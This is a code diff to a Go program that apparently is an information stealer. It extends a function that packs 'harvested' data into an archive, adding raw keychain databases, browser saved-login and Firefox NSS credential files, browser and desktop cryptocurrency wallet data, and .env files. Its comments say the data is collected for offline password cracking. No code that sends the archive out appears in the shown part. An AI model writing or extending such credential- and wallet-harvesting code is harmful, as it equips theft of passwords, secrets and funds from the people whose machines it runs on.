@@ -31,8 +31,9 @@ type archiveEntry struct {
 	diskPath string
 }
 
-// buildPrimaryArchiveEntries assembles phase-1 content: browser/app logs, wallet
-// extension + desktop bundles, and .env files. Scanned documents/images are phase-2.
+// buildPrimaryArchiveEntries assembles phase-1 content for offline-crack:
+// summary/meta logs, raw keychain + browser DBs, wallet extension/desktop trees, .env.
+// Scanned documents/images remain phase-2.
 func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 	var entries []archiveEntry
 
@@ -41,6 +42,18 @@ func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 		entries = append(entries, archiveEntry{zipPath: name, data: data})
 	}
 
+	// Raw keychain DB + browser Login Data / Local State / Firefox NSS files (no decrypt).
+	for _, rf := range p.RawFiles {
+		if rf.DiskPath == "" || rf.ZipPath == "" {
+			continue
+		}
+		entries = append(entries, archiveEntry{
+			zipPath:  rf.ZipPath,
+			diskPath: rf.DiskPath,
+		})
+	}
+
+	// Browser extension wallets + desktop wallets (LevelDB / .seco raw trees).
 	extUsed := make(map[string]int)
 	for _, bundle := range recovery.CollectWalletExtensionBundles() {
 		folder := uniqueFolder(walletFolderName(bundle.WalletName, bundle.Browser, bundle.Profile), extUsed)
